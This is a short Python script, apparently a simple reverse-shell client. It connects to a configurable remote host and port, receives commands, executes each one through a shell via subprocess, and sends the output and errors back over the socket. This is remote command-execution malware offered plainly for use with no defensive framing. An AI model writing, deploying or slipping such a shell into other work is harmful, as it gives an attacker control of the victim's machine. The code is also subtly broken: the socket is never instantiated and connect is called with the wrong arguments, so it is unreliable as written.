# -*- coding: utf-8 -*-
"""
Created on Fri Mar 18 15:04:41 2022

@author: User
"""

import socket
import subprocess # for running commands on shell

REMOTE_HOST = '127.0.0.1' #any ip address
REMOTE_PORT = 8081 #any port

client = socket.socket
print("Initiating connection")
client.connect(REMOTE_HOST, REMOTE_PORT)
print("connection initiated")


while True: #to keep listening and wait for messages
    print("Awaiting commands")
    command = client.recv(1024) # to read at most 1024 bytes
    command = command.decode() #decode to a string
    # message passed to subprocess program
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read() #check for output
    output_error = op.stderr.read()  #check for error
    print("[-] Sending response...")
    client.send(output + output_error)               #send both over the network    